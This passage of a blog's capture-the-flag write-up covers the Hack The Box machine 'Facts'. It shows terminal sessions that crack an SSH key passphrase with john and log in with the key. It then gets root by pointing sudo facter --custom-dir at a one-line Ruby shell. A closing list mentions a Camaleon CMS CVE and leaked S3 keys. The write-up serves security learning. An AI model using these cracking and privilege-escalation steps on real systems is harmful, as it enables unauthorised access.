+</span></span><span style="display:flex;"><span>└─$ ssh2john id_ed25519 &gt; hash.txt
+</span></span><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>dragonballz      (id_ed25519)
+</span></span><span style="display:flex;"><span>1g 0:00:01:32 DONE (2026-06-08 10:18) ...
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Passphrase is <code>dragonballz</code>. Unlocking the key reveals the owner in the comment field:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ ssh-keygen -y -f id_ed25519
+</span></span><span style="display:flex;"><span>Enter passphrase for &#34;id_ed25519&#34;:
+</span></span><span style="display:flex;"><span>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPiQe3iMlyEc/KW13EGRmOhoom/L7n8zNXJx2XXSt4f6 trivia@facts.htb
+</span></span></code></pre></div><h2 id="getting-a-shell">Getting a shell<a hidden class="anchor" aria-hidden="true" href="#getting-a-shell">#</a></h2>
+<p>The key belongs to <code>trivia</code>. SSH in:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>┌──(d3vilsec㉿kali)-[~]
+</span></span><span style="display:flex;"><span>└─$ ssh -i id_ed25519 trivia@facts.htb
+</span></span><span style="display:flex;"><span>Enter passphrase for key &#39;id_ed25519&#39;:
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>trivia@facts:~$
+</span></span></code></pre></div><p>We&rsquo;re in. Poking around <code>/home</code>, the permissions on <code>william</code>&rsquo;s directory are loose enough to read:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>trivia@facts:~$ ls -l /home
+</span></span><span style="display:flex;"><span>total 8
+</span></span><span style="display:flex;"><span>drwxr-x--- 6 trivia  trivia  4096 May 13 13:21 trivia
+</span></span><span style="display:flex;"><span>drwxr-xr-x 2 william william 4096 Jan 26 11:40 william
+</span></span><span style="display:flex;"><span>trivia@facts:~$ ls -l /home/william
+</span></span><span style="display:flex;"><span>total 4
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 root william 33 Jun  8 02:20 user.txt
+</span></span><span style="display:flex;"><span>trivia@facts:~$ cat /home/william/user.txt
+</span></span><span style="display:flex;"><span>[REDACTED]
+</span></span></code></pre></div><p>User flag down.</p>
+<h2 id="privilege-escalation--sudo-facter-custom-fact">Privilege escalation — sudo facter custom fact<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation--sudo-facter-custom-fact">#</a></h2>
+<p>Checked <code>trivia</code>&rsquo;s sudo rights:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>trivia@facts:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries for trivia on facts:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path=..., use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User trivia may run the following commands on facts:
+</span></span><span style="display:flex;"><span>    (ALL) NOPASSWD: /usr/bin/facter
+</span></span></code></pre></div><p><code>facter</code> was new to me — it&rsquo;s a Puppet tool that gathers and reports hardware/network/OS data about a system. The <code>--help</code> output had the lead I needed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>           [--custom-dir]                 A directory to use for custom facts.
+</span></span></code></pre></div><p>Facter loads &ldquo;custom facts&rdquo; — Ruby files — from a directory you point it at. Since I can run <code>facter</code> as root with no password, a custom fact that just execs a shell runs as root. I dropped a one-line Ruby file and pointed <code>--custom-dir</code> at it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>trivia@facts:~$ cat /tmp/d3vilsec/exploit.rb
+</span></span><span style="display:flex;"><span>exec &#34;/bin/bash&#34;
+</span></span><span style="display:flex;"><span>trivia@facts:~$ sudo facter --custom-dir /tmp/d3vilsec
+</span></span><span style="display:flex;"><span>root@facts:/home/trivia#
+</span></span></code></pre></div><p>Root. Grabbed the final flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@facts:/home/trivia# cat /root/root.txt
+</span></span><span style="display:flex;"><span>[REDACTED]
+</span></span></code></pre></div><h2 id="takeaways">Takeaways<a hidden class="anchor" aria-hidden="true" href="#takeaways">#</a></h2>
+<ul>
+<li><strong>Don&rsquo;t brute-force when you can fingerprint.</strong> <code>ffuf</code> was a dead end here; <code>nikto</code> reading the asset paths handed me the exact CMS and theme, and the version was sitting in the admin panel. A known version number turns recon into a CVE lookup.</li>
+<li><strong>CVE-2025-2304</strong> in Camaleon CMS 2.9.0 escalates a self-registered account to admin and leaks the app&rsquo;s S3 credentials — a reminder that app secrets stored server-side are only one bug away from exposure.</li>
+<li>The S3 endpoint was an internal <strong>MinIO</strong> instance, and a private SSH key sitting in a bucket is game over. Misconfigured object storage is a goldmine.</li>
+<li>The root cause of the privesc is a dangerous <strong>sudo entry</strong>: any binary that loads user-supplied code (here <code>facter --custom-dir</code>) is effectively a root shell. <a href="https://gtfobins.github.io/">GTFOBins</a> is the first place to check any binary you can run with sudo.</li>
+</ul>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>Facts was a good step up from Cap because there was no hand-holding — I had to figure out the path myself, and a big chunk of that was researching things I&rsquo;d never seen before. First time touching the <strong>AWS/S3 CLI</strong>, first time abusing <strong><code>facter</code></strong> for privesc. I got genuinely lost after dumping the S3 keys and had to stop and learn what S3 even was before I could move.</p>
+<p>The real lesson from this one is about <em>researching the unknown</em> efficiently. When I hit <code>facter</code>, knowing to check <strong>GTFOBins</strong> for a way to abuse a misconfigured binary is exactly the reflex I want to build. On to the next one.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://d3vilsec.com/tags/htb/">Htb</a></li>
+      <li><a href="https://d3vilsec.com/tags/writeup/">Writeup</a></li>
+      <li><a href="https://d3vilsec.com/tags/linux/">Linux</a></li>
+      <li><a href="https://d3vilsec.com/tags/camaleon-cms/">Camaleon-Cms</a></li>
+      <li><a href="https://d3vilsec.com/tags/s3/">S3</a></li>
+      <li><a href="https://d3vilsec.com/tags/minio/">Minio</a></li>
+      <li><a href="https://d3vilsec.com/tags/privilege-escalation/">Privilege-Escalation</a></li>
+      <li><a href="https://d3vilsec.com/tags/sudo/">Sudo</a></li>
+      <li><a href="https://d3vilsec.com/tags/facter/">Facter</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://d3vilsec.com/">d3vilsec</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
